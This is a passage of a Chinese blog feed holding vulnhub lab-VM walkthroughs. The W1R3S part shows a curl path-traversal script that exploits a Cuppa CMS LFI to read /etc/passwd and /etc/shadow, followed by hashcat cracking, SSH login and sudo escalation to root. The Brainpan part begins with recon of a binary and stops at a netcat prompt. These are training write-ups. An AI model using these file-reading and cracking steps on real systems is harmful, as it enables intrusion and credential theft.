DIRECTORY: http://192.168.66.7/wordpress/wp-content/uploads/                                      </span><br><span class="line">                                                                                                      </span><br><span class="line">---- Entering directory: http://192.168.66.7/administrator/components/configuration/ ----</span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/administrator/components/configuration/html/                       </span><br><span class="line">+ http://192.168.66.7/administrator/components/configuration/index.php (CODE:200|SIZE:45)             </span><br><span class="line">                                                                                                      </span><br><span class="line">---- Entering directory: http://192.168.66.7/administrator/components/menu/ ----</span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/administrator/components/menu/classes/                             </span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/administrator/components/menu/html/                                </span><br><span class="line">+ http://192.168.66.7/administrator/components/menu/index.php (CODE:200|SIZE:45)                      </span><br><span class="line">                                                                                                      </span><br><span class="line">---- Entering directory: http://192.168.66.7/administrator/components/stats/ ----</span><br><span class="line">+ http://192.168.66.7/administrator/components/stats/index.php (CODE:200|SIZE:45)                                                                                                                                                                                                                                </span><br><span class="line">---- Entering directory: http://192.168.66.7/administrator/templates/default/ ----</span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/administrator/templates/default/classes/                           </span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/administrator/templates/default/css/                               </span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/administrator/templates/default/html/                              </span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/administrator/templates/default/images/                            </span><br><span class="line">+ http://192.168.66.7/administrator/templates/default/index.php (CODE:500|SIZE:0)                     </span><br><span class="line">                                                                                                                                                                                                           </span><br><span class="line">---- Entering directory: http://192.168.66.7/wordpress/wp-admin/network/ ----</span><br><span class="line">+ http://192.168.66.7/wordpress/wp-admin/network/admin.php (CODE:302|SIZE:0)                          </span><br><span class="line">+ http://192.168.66.7/wordpress/wp-admin/network/index.php (CODE:302|SIZE:0)                          </span><br><span class="line">                                                                                                      </span><br><span class="line">---- Entering directory: http://192.168.66.7/wordpress/wp-admin/user/ ----</span><br><span class="line">+ http://192.168.66.7/wordpress/wp-admin/user/admin.php (CODE:302|SIZE:0)                             </span><br><span class="line">+ http://192.168.66.7/wordpress/wp-admin/user/index.php (CODE:302|SIZE:0)                             </span><br><span class="line">                                                                                                      </span><br><span class="line">---- Entering directory: http://192.168.66.7/wordpress/wp-content/plugins/ ----</span><br><span class="line">+ http://192.168.66.7/wordpress/wp-content/plugins/index.php (CODE:200|SIZE:0)                        </span><br><span class="line">                                                                                                      </span><br><span class="line">---- Entering directory: http://192.168.66.7/wordpress/wp-content/themes/ ----</span><br><span class="line">+ http://192.168.66.7/wordpress/wp-content/themes/index.php (CODE:200|SIZE:0)</span><br></pre></td></tr></table></figure>

<p>administrator目录原来是Cuppa CMS的安装设置。这是将浏览器指向/administrator时呈现出的页面。</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub129.jpg"></p>
<p>根据官方文档，为了完成安装，必须首先创建数据库。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Remember, the database should be created before to install Cuppa CMS.</span><br></pre></td></tr></table></figure>

<p>首先，Cuppa CMS安装未完成，否则将看不到设置页面。下载了Cuppa CMS代码的副本，以查看是否可以发现任何漏洞。不确定这是否是新漏洞，但在第77行的alertConfigField.php中找到一个LFI漏洞令人惊喜。</p>
<p><img src="https://hackso.me/assets/images/posts/w1r3s-1.0.1-walkthrough/screenshot-2.png"></p>
<p>为了测试它，编写了cat.sh，一个简单的脚本，只要有权限，它就会显示任何文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">_HOST=192.168.66.7</span><br><span class="line">_PATH=administrator/alerts/alertConfigField.php</span><br><span class="line">_PARM=urlConfig</span><br><span class="line">_TRAV=../../../../../../../..</span><br><span class="line"></span><br><span class="line">curl -s --data-urlencode <span class="string">&quot;<span class="variable">$&#123;_PARM&#125;</span>=<span class="variable">$&#123;_TRAV&#125;</span><span class="variable">$1</span>&quot;</span> <span class="variable">$_HOST</span>/<span class="variable">$_PATH</span> \</span><br><span class="line">| sed -r <span class="string">&#x27;s/^ &#123;8&#125;//&#x27;</span> \</span><br><span class="line">| sed <span class="string">&#x27;71,$!d&#x27;</span> \</span><br><span class="line">| sed <span class="string">&#x27;$d&#x27;</span> \</span><br><span class="line">| sed <span class="string">&#x27;$d&#x27;</span></span><br></pre></td></tr></table></figure>

<p>运行脚本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ./cat.sh /etc/passwd</span></span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/<span class="literal">false</span></span><br><span class="line">systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/<span class="literal">false</span></span><br><span class="line">systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/<span class="literal">false</span></span><br><span class="line">systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/<span class="literal">false</span></span><br><span class="line">syslog:x:104:108::/home/syslog:/bin/<span class="literal">false</span></span><br><span class="line">_apt:x:105:65534::/nonexistent:/bin/<span class="literal">false</span></span><br><span class="line">messagebus:x:106:110::/var/run/dbus:/bin/<span class="literal">false</span></span><br><span class="line">uuidd:x:107:111::/run/uuidd:/bin/<span class="literal">false</span></span><br><span class="line">lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/<span class="literal">false</span></span><br><span class="line">whoopsie:x:109:117::/nonexistent:/bin/<span class="literal">false</span></span><br><span class="line">avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/<span class="literal">false</span></span><br><span class="line">avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/<span class="literal">false</span></span><br><span class="line">dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/<span class="literal">false</span></span><br><span class="line">colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/<span class="literal">false</span></span><br><span class="line">speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/<span class="literal">false</span></span><br><span class="line">hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/<span class="literal">false</span></span><br><span class="line">kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/<span class="literal">false</span></span><br><span class="line">pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/<span class="literal">false</span></span><br><span class="line">rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/<span class="literal">false</span></span><br><span class="line">saned:x:119:127::/var/lib/saned:/bin/<span class="literal">false</span></span><br><span class="line">usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/<span class="literal">false</span></span><br><span class="line">w1r3s:x:1000:1000:w1r3s,,,:/home/w1r3s:/bin/bash</span><br><span class="line">sshd:x:121:65534::/var/run/sshd:/usr/sbin/nologin</span><br><span class="line">ftp:x:122:129:ftp daemon,,,:/srv/ftp:/bin/<span class="literal">false</span></span><br><span class="line">mysql:x:123:130:MySQL Server,,,:/nonexistent:/bin/<span class="literal">false</span></span><br><span class="line">root@kali:~<span class="comment"># ./cat.sh /etc/shadow</span></span><br><span class="line">root:<span class="variable">$6</span><span class="variable">$vYcecPCy</span><span class="variable">$JNbK</span>.hr7HU72ifLxmjpIP9kTcx./ak2MM3lBs.Ouiu0mENav72TfQIs8h1jPm2rwRFqd87HDC0pi7gn9t7VgZ0:17554:0:99999:7:::</span><br><span class="line">daemon:*:17379:0:99999:7:::</span><br><span class="line">bin:*:17379:0:99999:7:::</span><br><span class="line">sys:*:17379:0:99999:7:::</span><br><span class="line">sync:*:17379:0:99999:7:::</span><br><span class="line">games:*:17379:0:99999:7:::</span><br><span class="line">man:*:17379:0:99999:7:::</span><br><span class="line">lp:*:17379:0:99999:7:::</span><br><span class="line">mail:*:17379:0:99999:7:::</span><br><span class="line">news:*:17379:0:99999:7:::</span><br><span class="line">uucp:*:17379:0:99999:7:::</span><br><span class="line">proxy:*:17379:0:99999:7:::</span><br><span class="line">www-data:<span class="variable">$6</span><span class="variable">$8JMxE7l0</span><span class="variable">$yQ16jM</span>..ZsFxpoGue8/0LBUnTas23zaOqg2Da47vmykGTANfutzM8MuFidtb0..Zk.TUKDoDAVRCoXiZAH.Ud1:17560:0:99999:7:::</span><br><span class="line">backup:*:17379:0:99999:7:::</span><br><span class="line">list:*:17379:0:99999:7:::</span><br><span class="line">irc:*:17379:0:99999:7:::</span><br><span class="line">gnats:*:17379:0:99999:7:::</span><br><span class="line">nobody:*:17379:0:99999:7:::</span><br><span class="line">systemd-timesync:*:17379:0:99999:7:::</span><br><span class="line">systemd-network:*:17379:0:99999:7:::</span><br><span class="line">systemd-resolve:*:17379:0:99999:7:::</span><br><span class="line">systemd-bus-proxy:*:17379:0:99999:7:::</span><br><span class="line">syslog:*:17379:0:99999:7:::</span><br><span class="line">_apt:*:17379:0:99999:7:::</span><br><span class="line">messagebus:*:17379:0:99999:7:::</span><br><span class="line">uuidd:*:17379:0:99999:7:::</span><br><span class="line">lightdm:*:17379:0:99999:7:::</span><br><span class="line">whoopsie:*:17379:0:99999:7:::</span><br><span class="line">avahi-autoipd:*:17379:0:99999:7:::</span><br><span class="line">avahi:*:17379:0:99999:7:::</span><br><span class="line">dnsmasq:*:17379:0:99999:7:::</span><br><span class="line">colord:*:17379:0:99999:7:::</span><br><span class="line">speech-dispatcher:!:17379:0:99999:7:::</span><br><span class="line">hplip:*:17379:0:99999:7:::</span><br><span class="line">kernoops:*:17379:0:99999:7:::</span><br><span class="line">pulse:*:17379:0:99999:7:::</span><br><span class="line">rtkit:*:17379:0:99999:7:::</span><br><span class="line">saned:*:17379:0:99999:7:::</span><br><span class="line">usbmux:*:17379:0:99999:7:::</span><br><span class="line">w1r3s:<span class="variable">$6</span><span class="variable">$xe</span>/eyoTx<span class="variable">$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb</span>/io7x9q1iP.:17567:0:99999:7:::</span><br><span class="line">sshd:*:17554:0:99999:7:::</span><br><span class="line">ftp:*:17554:0:99999:7:::</span><br><span class="line">mysql:!:17554:0:99999:7:::</span><br></pre></td></tr></table></figure>

<p>可以看到/etc/shadow中有3个用户有密码hash，将hash值取出来放到hashcat中破解</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$6</span><span class="variable">$vYcecPCy</span><span class="variable">$JNbK</span>.hr7HU72ifLxmjpIP9kTcx./ak2MM3lBs.Ouiu0mENav72TfQIs8h1jPm2rwRFqd87HDC0pi7gn9t7VgZ0</span><br><span class="line"><span class="variable">$6</span><span class="variable">$8JMxE7l0</span><span class="variable">$yQ16jM</span>..ZsFxpoGue8/0LBUnTas23zaOqg2Da47vmykGTANfutzM8MuFidtb0..Zk.TUKDoDAVRCoXiZAH.Ud1</span><br><span class="line"><span class="variable">$6</span><span class="variable">$xe</span>/eyoTx<span class="variable">$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb</span>/io7x9q1iP.</span><br></pre></td></tr></table></figure>

<p>没办法，电脑GPU强，hashcat加载rockyou.txt字典几分钟就把3个hash值破解完了。。。</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub130.jpg"></p>
<p>3个hash值里面，只有一个hash被破解出来了。。。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">D:\hashcat-5.1.0\hashcat-5.1.0&gt;hashcat64.exe -m 1800 password.txt --show</span><br><span class="line"><span class="variable">$6</span><span class="variable">$xe</span>/eyoTx<span class="variable">$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb</span>/io7x9q1iP.:computer</span><br></pre></td></tr></table></figure>

<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>使用w1r3s/computer连接ssh</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ssh w1r3s@192.168.66.7</span></span><br><span class="line">The authenticity of host <span class="string">&#x27;192.168.66.7 (192.168.66.7)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:/3N0PzPMqtXlj9QWJFMbCufh2W95JylZ/oF82NkAAto.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>192.168.66.7<span class="string">&#x27; (ECDSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">----------------------</span></span><br><span class="line"><span class="string">Think this is the way?</span></span><br><span class="line"><span class="string">----------------------</span></span><br><span class="line"><span class="string">Well,........possibly.</span></span><br><span class="line"><span class="string">----------------------</span></span><br><span class="line"><span class="string">w1r3s@192.168.66.7&#x27;</span>s password: </span><br><span class="line">Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.15.0-74-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">228 packages can be updated.</span><br><span class="line">0 updates are security updates.</span><br><span class="line">                                                                                   </span><br><span class="line">.....You made it huh?....                                                          </span><br><span class="line">Last login: Mon Jan 22 22:47:27 2018 from 192.168.0.35                             </span><br><span class="line">w1r3s@W1R3S:~$ id                                                                           </span><br><span class="line">uid=1000(w1r3s) gid=1000(w1r3s) groups=1000(w1r3s),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)</span><br><span class="line">w1r3s@W1R3S:~$ whoami</span><br><span class="line">w1r3s</span><br></pre></td></tr></table></figure>

<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>看到w1r3s在sudoers列表中。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">w1r3s@W1R3S:~$ sudo -l</span><br><span class="line">[sudo] password <span class="keyword">for</span> w1r3s: </span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> w1r3s on W1R3S.localdomain:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User w1r3s may run the following commands on W1R3S.localdomain:</span><br><span class="line">    (ALL : ALL) ALL</span><br></pre></td></tr></table></figure>

<p>直接提权拿到flag</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">w1r3s@W1R3S:~$ sudo /bin/bash</span><br><span class="line">root@W1R3S:~<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@W1R3S:~<span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line">root@W1R3S:~<span class="comment"># cd /root</span></span><br><span class="line">root@W1R3S:/root<span class="comment"># ls</span></span><br><span class="line">flag.txt</span><br><span class="line">root@W1R3S:/root<span class="comment"># cat flag.txt </span></span><br><span class="line">-----------------------------------------------------------------------------------------</span><br><span class="line">   ____ ___  _   _  ____ ____      _  _____ _   _ _        _  _____ ___ ___  _   _ ____  </span><br><span class="line">  / ___/ _ \| \ | |/ ___|  _ \    / \|_   _| | | | |      / \|_   _|_ _/ _ \| \ | / ___| </span><br><span class="line"> | |  | | | |  \| | |  _| |_) |  / _ \ | | | | | | |     / _ \ | |  | | | | |  \| \___ \ </span><br><span class="line"> | |__| |_| | |\  | |_| |  _ &lt;  / ___ \| | | |_| | |___ / ___ \| |  | | |_| | |\  |___) |</span><br><span class="line">  \____\___/|_| \_|\____|_| \_\/_/   \_\_|  \___/|_____/_/   \_\_| |___\___/|_| \_|____/ </span><br><span class="line">                                                                                        </span><br><span class="line">-----------------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">                          .-----------------TTTT_-----_______</span><br><span class="line">                        /<span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#x27;</span>(______O] ----------____  \______/]_</span><br><span class="line">     __...---<span class="string">&#x27;&quot;&quot;&quot;\_ --&#x27;</span><span class="string">&#x27;   Q                               ___________@</span></span><br><span class="line"><span class="string"> |&#x27;</span><span class="string">&#x27;&#x27;</span>                   ._   _______________=---------<span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string"> |                ..--&#x27;&#x27;|   l L |_l   |</span></span><br><span class="line"><span class="string"> |          ..--&#x27;&#x27;      .  /-___j &#x27;   &#x27;</span></span><br><span class="line"><span class="string"> |    ..--&#x27;&#x27;           /  ,       &#x27;   &#x27;</span></span><br><span class="line"><span class="string"> |--&#x27;&#x27;                /           `    \</span></span><br><span class="line"><span class="string">                      L__&#x27;         \    -</span></span><br><span class="line"><span class="string">                                    -    &#x27;-.</span></span><br><span class="line"><span class="string">                                     &#x27;.    /</span></span><br><span class="line"><span class="string">                                       &#x27;-./</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">----------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="string">  YOU HAVE COMPLETED THE</span></span><br><span class="line"><span class="string">               __      __  ______________________   _________</span></span><br><span class="line"><span class="string">              /  \    /  \/_   \______   \_____  \ /   _____/</span></span><br><span class="line"><span class="string">              \   \/\/   / |   ||       _/ _(__  &lt; \_____  \ </span></span><br><span class="line"><span class="string">               \        /  |   ||    |   \/       \/        \</span></span><br><span class="line"><span class="string">                \__/\  /   |___||____|_  /______  /_______  /.INC</span></span><br><span class="line"><span class="string">                     \/                \/       \/        \/        CHALLENGE, V 1.0</span></span><br><span class="line"><span class="string">----------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">CREATED BY SpecterWires</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">----------------------------------------------------------------------------------------</span></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub131.jpg"></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul>
<li>枚举目录的能力-此技能可以节省大量时间，因为在许多情况下，会发现有趣的路径充当入口点。</li>
<li>能够搜索运行服务的漏洞-在这种情况下，设法通过一个简单的Google搜索就发现了CUPPA漏洞。利用漏洞数据库和Google之类的搜索引擎可以节省大量时间。</li>
</ul>
<p><font color="red">Game over</font></p>
<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="green"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[brainpan-1]</title>
    <url>/2020/01/26/brainpan-1/</url>
    <content><![CDATA[<h3 id="名称"><a href="#名称" class="headerlink" title="名称"></a>名称</h3><p>名称：Brainpan：1<br>发布日期：2013年3月20日</p>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><ul>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9icmFpbnBhbi9CcmFpbnBhbi56aXA=">https://download.vulnhub.com/brainpan/Brainpan.zip<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9icmFpbnBhbi9CcmFpbnBhbi56aXAudG9ycmVudA==">https://download.vulnhub.com/brainpan/Brainpan.zip.torrent<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> _               _                         </span><br><span class="line">| |__  _ __ __ _(_)_ __  _ __   __ _ _ __  </span><br><span class="line">| <span class="string">&#x27;_ \| &#x27;</span>__/ _` | | <span class="string">&#x27;_ \| &#x27;</span>_ \ / _` | <span class="string">&#x27;_ \ </span></span><br><span class="line"><span class="string">| |_) | | | (_| | | | | | |_) | (_| | | | |</span></span><br><span class="line"><span class="string">|_.__/|_|  \__,_|_|_| |_| .__/ \__,_|_| |_|</span></span><br><span class="line"><span class="string">                        |_|                </span></span><br><span class="line"><span class="string">                            by superkojiman  </span></span><br><span class="line"><span class="string">                 http://www.techorganic.com</span></span><br></pre></td></tr></table></figure>

<h2 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h2><p>使用此虚拟机，即表示您同意，在任何情况下概不负责任何损失或损害，包括但不限于间接或随之而来的损失或损害，或任何损失或损害因使用引起的或与使用有关的数据或利润损失该软件。<br>TL; DR：如果发生坏事，这不是我的错。</p>
<h2 id="设定"><a href="#设定" class="headerlink" title="设定"></a>设定</h2><p>Brainpan经过测试，发现可在以下虚拟机监控程序上工作：<br>-VMware Player 5.0.1<br>-VMWare Fusion 5.0<br>-VirtualBox 4.2.8<br>将Brainpan导入首选的虚拟机监控程序并配置网络根据需要进行设置。它会通过DHCP获取IP地址，但是建议在NAT内运行它，或者仅对主机操作系统可见，因为它容易受到攻击。</p>
<p>资料来源：Brainpan.zip/readme.txt</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">MD5（brainpan.ova）= fc0f163220b9884df5dcc9cdc45361e4</span><br></pre></td></tr></table></figure>
<p>资料来源：Brainpan.zip/md5.txtVulnHub独家！</p>
<a id="more"></a>

<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>nmap扫一顿</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.56.0/24</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.115</span><br><span class="line">Host is up (0.00042s latency).</span><br><span class="line">MAC Address: 08:00:27:DE:BA:CA (Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># nmap -p- -v -Pn -sV 192.168.56.115</span></span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">9999/tcp  open  abyss?</span><br><span class="line">10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)</span><br></pre></td></tr></table></figure>

<p>访问一下看看是什么东西:</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub188.jpg"></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub189.jpg"></p>
<p>扫一下目录看看</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub190.jpg"></p>
<p>在bin目录中有一个二进制文件？</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub191.jpg"></p>
<p>将这个exe文件下载下来，然后用ollydbug工具调试</p>
<p>调试之前，先分析下brainpan.exe</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/brainpan1<span class="comment"># file brainpan.exe </span></span><br><span class="line">brainpan.exe: PE32 executable (console) Intel 80386 (stripped to external PDB), <span class="keyword">for</span> MS Windows</span><br><span class="line">root@kali:~/vulnhub/brainpan1<span class="comment"># strings brainpan.exe </span></span><br><span class="line">!This program cannot be run <span class="keyword">in</span> DOS mode.</span><br><span class="line">.text</span><br><span class="line">`.data</span><br><span class="line">.rdata</span><br><span class="line">@.bss</span><br><span class="line">.idata</span><br><span class="line">[^_]</span><br><span class="line">AAAA</span><br><span class="line">AAAA</span><br><span class="line">AAAA</span><br><span class="line">AAAA</span><br><span class="line">AAAA</span><br><span class="line">AAAA</span><br><span class="line">AAAA</span><br><span class="line">AAAA</span><br><span class="line">[^_]</span><br><span class="line">[get_reply] s = [%s]</span><br><span class="line">[get_reply] copied %d bytes to buffer</span><br><span class="line">shitstorm</span><br><span class="line">_|                            _|                                        </span><br><span class="line">_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  </span><br><span class="line">_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|</span><br><span class="line">_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|</span><br><span class="line">_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|</span><br><span class="line">                                            _|                          </span><br><span class="line">                                            _|</span><br><span class="line">[________________________ WELCOME TO BRAINPAN _________________________]</span><br><span class="line">                          ENTER THE PASSWORD                              </span><br><span class="line">                          &gt;&gt; </span><br><span class="line">                          ACCESS DENIED</span><br><span class="line">                          ACCESS GRANTED</span><br><span class="line">[+] initializing winsock...</span><br><span class="line">[!] winsock init failed: %d</span><br><span class="line"><span class="keyword">done</span>.</span><br><span class="line">[!] could not create socket: %d</span><br><span class="line">[+] server socket created.</span><br><span class="line">[!] <span class="built_in">bind</span> failed: %d</span><br><span class="line">[+] <span class="built_in">bind</span> <span class="keyword">done</span> on port %d</span><br><span class="line">[+] waiting <span class="keyword">for</span> connections.</span><br><span class="line">[+] received connection.</span><br><span class="line">[+] check is %d</span><br><span class="line">[!] accept failed: %d</span><br><span class="line">[+] cleaning up.</span><br><span class="line">-LIBGCCW32-EH-3-SJLJ-GTHR-MINGW32</span><br><span class="line">w32_sharedptr-&gt;size == sizeof(W32_EH_SHARED)</span><br><span class="line">../../gcc-3.4.5/gcc/config/i386/w32-shared-ptr.c</span><br><span class="line">GetAtomNameA (atom, s, sizeof(s)) != 0</span><br><span class="line">AddAtomA</span><br><span class="line">ExitProcess</span><br><span class="line">FindAtomA</span><br><span class="line">GetAtomNameA</span><br><span class="line">SetUnhandledExceptionFilter</span><br><span class="line">__getmainargs</span><br><span class="line">__p__environ</span><br><span class="line">__p__fmode</span><br><span class="line">__set_app_type</span><br><span class="line">_assert</span><br><span class="line">_cexit</span><br><span class="line">_iob</span><br><span class="line">_onexit</span><br><span class="line">_setmode</span><br><span class="line">abort</span><br><span class="line">atexit</span><br><span class="line">free</span><br><span class="line">malloc</span><br><span class="line">memset</span><br><span class="line"><span class="built_in">printf</span></span><br><span class="line">signal</span><br><span class="line">strcmp</span><br><span class="line">strcpy</span><br><span class="line">strlen</span><br><span class="line">太多了省略。。。</span><br></pre></td></tr></table></figure>

<p>这里有几个很重要：</p>
<ul>
<li>这个brainpan.exe看起来与端口9999上的侦听过程相同</li>
<li>shitstorm 看起来像密码</li>
<li>strcpy 可能是缓冲区溢出攻击向量</li>
</ul>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub192.jpg"></p>
<p>显然，应该尝试可能的密码shitstorm。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc 192.168.56.115 9999</span></span><br><span class="line">_|                            _|                                        </span><br><span class="line">_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  </span><br><span class="line">_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|</span><br><span class="line">_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|</span><br><span class="line">_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|</span><br><span class="line">                                            _|                          </span><br><span class="line">                                            _|</span><br><span class="line"></span><br><span class="line">[________________________ WELCOME TO BRAINPAN _________________________]</span><br><span class="line">                          ENTER THE PASSWORD                              </span><br><span class="line"></span><br><span class="line">                          &gt;&gt; 